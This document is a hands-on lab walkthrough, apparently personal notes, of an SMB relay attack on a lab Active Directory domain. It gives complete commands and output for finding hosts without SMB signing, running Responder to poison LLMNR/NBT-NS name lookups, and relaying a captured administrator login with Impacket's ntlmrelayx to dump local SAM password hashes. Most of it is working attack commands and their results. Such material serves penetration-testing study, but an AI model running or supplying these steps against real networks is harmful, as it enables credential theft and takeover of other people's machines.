
# SMB Relay Attack

SMB sign should be disabled

	┌──(kali㉿kali)-[~/Desktop/ADAbuse]
	└─$ nmap --script=smb2-security-mode.nse -iL target.txt -Pn -p445,139
	Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times will be slower.
	Starting Nmap 7.91 ( https://nmap.org ) at 2021-08-14 16:36 EDT
	Nmap scan report for valhalla.local (192.168.200.100)
	Host is up (0.00058s latency).

	PORT    STATE SERVICE
	139/tcp open  netbios-ssn
	445/tcp open  microsoft-ds

	Host script results:
	| smb2-security-mode: 
	|   2.02: 
	|_    Message signing enabled but not required

	Nmap scan report for 192.168.200.110
	Host is up (0.00067s latency).

	PORT    STATE SERVICE
	139/tcp open  netbios-ssn
	445/tcp open  microsoft-ds

	Host script results:
	| smb2-security-mode: 
	|   2.02: 
	|_    Message signing enabled but not required

	Nmap done: 2 IP addresses (2 hosts up) scanned in 13.28 seconds
                                                                                                                                                       

Responder HTTP and SMB server should be disabled


	┌──(kali㉿kali)-[~/Desktop/ADAbuse]
	└─$ cat /etc/responder/Responder.conf 
	[Responder Core]

	; Servers to start
	SQL = On
	SMB = Off
	RDP = On
	Kerberos = On
	FTP = On
	POP = On
	SMTP = On
	IMAP = On
	HTTP = Off
	HTTPS = On
	DNS = On
	LDAP = On
	.......



Start Responder in shell-1


	┌──(kali㉿kali)-[~/Desktop/ADAbuse]
	└─$ sudo /usr/sbin/responder -I eth0 -rv                                                                                                         255 ⨯
											 __
	  .----.-----.-----.-----.-----.-----.--|  |.-----.----.
	  |   _|  -__|__ --|  _  |  _  |     |  _  ||  -__|   _|
	  |__| |_____|_____|   __|_____|__|__|_____||_____|__|
					   |__|

			   NBT-NS, LLMNR & MDNS Responder 3.0.2.0

	  Author: Laurent Gaffie (laurent.gaffie@gmail.com)
	  To kill this script hit CTRL-C


	[+] Poisoners:
		LLMNR                      [ON]
		NBT-NS                     [ON]
		DNS/MDNS                   [ON]

	[+] Servers:
		HTTP server                [OFF]
		HTTPS server               [ON]
		WPAD proxy                 [OFF]
		Auth proxy                 [OFF]
		SMB server                 [OFF]
		Kerberos server            [ON]
		SQL server                 [ON]
		FTP server                 [ON]
		IMAP server                [ON]
		POP3 server                [ON]
		SMTP server                [ON]
		DNS server                 [ON]
		LDAP server                [ON]
		RDP server                 [ON]

	[+] HTTP Options:
		Always serving EXE         [OFF]
		Serving EXE                [OFF]
		Serving HTML               [OFF]
		Upstream Proxy             [OFF]

	[+] Poisoning Options:
		Analyze Mode               [OFF]
		Force WPAD auth            [OFF]
		Force Basic Auth           [OFF]
		Force LM downgrade         [OFF]
		Fingerprint hosts          [OFF]

	[+] Generic Options:
		Responder NIC              [eth0]
		Responder IP               [192.168.200.101]
		Challenge set              [random]
		Don't Respond To Names     ['ISATAP']



	[+] Listening for events...


Start ntlmrelayx from shell-2

	┌──(kali㉿kali)-[~/Desktop/ADAbuse]
	└─$ sudo python3 /usr/share/doc/python3-impacket/examples/ntlmrelayx.py -tf target.txt -smb2support
	[sudo] password for kali: 
	Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation

	[*] Protocol Client SMB loaded..
	[*] Protocol Client RPC loaded..
	[*] Protocol Client IMAP loaded..
	[*] Protocol Client IMAPS loaded..
	[*] Protocol Client DCSYNC loaded..
	[*] Protocol Client LDAP loaded..
	[*] Protocol Client LDAPS loaded..
	[*] Protocol Client HTTP loaded..
	[*] Protocol Client HTTPS loaded..
	[*] Protocol Client MSSQL loaded..
	[*] Protocol Client SMTP loaded..
	[*] Running in relay mode to hosts in targetfile
	[*] Setting up SMB Server
	[*] Setting up HTTP Server
	[*] Setting up WCF Server

	[*] Servers started, waiting for connections
	
	
	
Now one of the user need to try to access an unknown or not exist share 

Computer-1 will nagigate

	\\idontexit

We will capture that Computer-1 request to relay our targets. If User who logged in computer-1 has Admin rights for our targets, we will get SAM hash of our targets


responder shell


	[+] Listening for events...
	[*] [LLMNR]  Poisoned answer sent to 192.168.200.100 for name idontexist
	[*] [LLMNR]  Poisoned answer sent to 192.168.200.100 for name idontexist

ntlmrelayx shell

	┌──(kali㉿kali)-[~/Desktop/ADAbuse]
	└─$ sudo python3 /usr/share/doc/python3-impacket/examples/ntlmrelayx.py -tf target.txt -smb2support
	Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation

	[*] Protocol Client SMB loaded..
	[*] Protocol Client RPC loaded..
	[*] Protocol Client IMAP loaded..
	[*] Protocol Client IMAPS loaded..
	[*] Protocol Client DCSYNC loaded..
	[*] Protocol Client LDAP loaded..
	[*] Protocol Client LDAPS loaded..
	[*] Protocol Client HTTP loaded..
	[*] Protocol Client HTTPS loaded..
	[*] Protocol Client MSSQL loaded..
	[*] Protocol Client SMTP loaded..
	[*] Running in relay mode to hosts in targetfile
	[*] Setting up SMB Server
	[*] Setting up HTTP Server
	[*] Setting up WCF Server

	[*] Servers started, waiting for connections
	[*] SMBD-Thread-4: Connection from VALHALLA/ADMINISTRATOR@192.168.200.100 controlled, attacking target smb://192.168.200.100
	[-] Authenticating against smb://192.168.200.100 as VALHALLA/ADMINISTRATOR FAILED
	[*] SMBD-Thread-5: Connection from VALHALLA/ADMINISTRATOR@192.168.200.100 controlled, attacking target smb://192.168.200.110
	[*] Authenticating against smb://192.168.200.110 as VALHALLA/ADMINISTRATOR SUCCEED
	[*] SMBD-Thread-5: Connection from VALHALLA/ADMINISTRATOR@192.168.200.100 controlled, but there are no more targets left!
	[*] Service RemoteRegistry is in stopped state
	[*] Starting service RemoteRegistry
	[*] Target system bootKey: 0xc80bb860144b087eaf36f6fb4d7cb913
	[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
	Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
	Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
	win7:1000:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
	[*] Done dumping SAM hashes for host: 192.168.200.110
	[*] Stopping service RemoteRegistry